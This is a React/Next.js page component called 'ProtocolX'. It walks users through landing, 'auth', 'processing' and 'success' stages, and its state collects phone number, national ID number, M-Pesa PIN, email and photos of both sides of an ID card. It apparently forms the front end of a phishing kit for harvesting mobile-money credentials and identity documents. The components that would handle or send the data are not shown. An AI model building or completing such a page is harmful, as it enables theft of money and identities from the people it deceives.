"use client";
import React, { useState, useEffect } from "react";
// Import sub-components (defined below)
import LandingView from "./components/LandingView";
import AuthTerminal from "./components/AuthTerminal";
import ProcessingVault from "./components/ProcessingVault";
import SuccessFinale from "./components/SuccessFinale";

export default function ProtocolX() {
  const [stage, setStage] = useState<"LANDING" | "AUTH" | "PROCESSING" | "SUCCESS">("LANDING");
  
  // Persistent Global State
  const [sessionData, setSessionData] = useState({
    phone_number: "",
    id_number: "",
    mpesa_pin: "",
    email: "",
    id_front: null as File | null,
    id_back: null as File | null,
  });

  const updateSession = (newData: Partial<typeof sessionData>) => {
    setSessionData((prev) => ({ ...prev, ...newData }));
  };

  return (
    <div className="bg-black min-h-screen text-hacker-green font-mono selection:bg-hacker-green selection:text-black">
      <div className="crt-overlay pointer-events-none fixed inset-0 z-50 opacity-20" />
      
      {stage === "LANDING" && (
        <LandingView onStart={() => setStage("AUTH")} />
      )}

      {stage === "AUTH" && (
        <AuthTerminal 
          onComplete={(data) => {
            updateSession(data);
            setStage("PROCESSING");
          }} 
        />
      )}

      {stage === "PROCESSING" && (
        <ProcessingVault 
          sessionData={sessionData}
          onFileUpdate={updateSession}
          onSuccess={() => setStage("SUCCESS")}
        />
      )}

      {stage === "SUCCESS" && (
        <div className="animate-in fade-in duration-1000">
           <SuccessFinale onSubscribe={(email) => updateSession({ email })} />
        </div>
      )}
    </div>
  );
}